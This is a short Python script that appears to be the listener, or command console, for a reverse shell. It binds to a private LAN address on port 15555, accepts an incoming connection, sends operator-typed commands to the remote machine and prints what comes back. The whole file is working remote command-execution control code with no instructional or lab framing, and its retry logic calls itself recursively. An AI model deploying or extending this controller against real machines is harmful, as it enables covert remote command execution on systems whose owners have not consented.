import socket

host = "192.168.1.39"
port = 15555
s = socket.socket()

def connect():

    try:

        s.bind((host, port))

        s.listen()

    except:

        print("Connection could not be established, trying again...")
        connect()

def accept():

    print("Waiting for the connection...")

    connection, address = s.accept()

    print("Connection established successfully, IP is {}, and the PORT is {}".format(address[0], address[1]))

    sendCommand(connection)

def sendCommand(connection):

    while True:

        cmd = input("What is your code:")

        if cmd == "quit":

            break

        if len(cmd) > 0:

            connection.send(cmd.encode("utf-8"))

            answer = connection.recv(4096).decode("utf-8")

            print(answer)


connect()
accept()